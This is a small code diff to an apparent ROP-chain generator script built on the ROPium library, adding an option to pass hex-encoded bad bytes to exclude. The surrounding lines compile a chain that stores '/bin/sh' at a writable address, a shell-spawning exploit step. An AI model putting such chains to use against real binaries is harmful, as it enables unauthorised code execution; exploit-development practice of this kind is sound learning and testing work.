@@ -9,7 +9,10 @@ rwaddr = sys.argv[4]
 rop = ROPium(ARCH.X64)
 rop.abi = ABI.X64_SYSTEM_V
 rop.os = OS.LINUX
-
+if len(sys.argv) == 6:
+    import binascii
+    bad_chars = sys.argv[5]
+    rop.bad_bytes = list(binascii.unhexlify(bad_chars))     # [0x00, 0x0a, 0x0b]
 rop.load(binary)
 
 store_mem_chain = rop.compile('[{}] = "/bin/sh\x00"'.format(rwaddr))
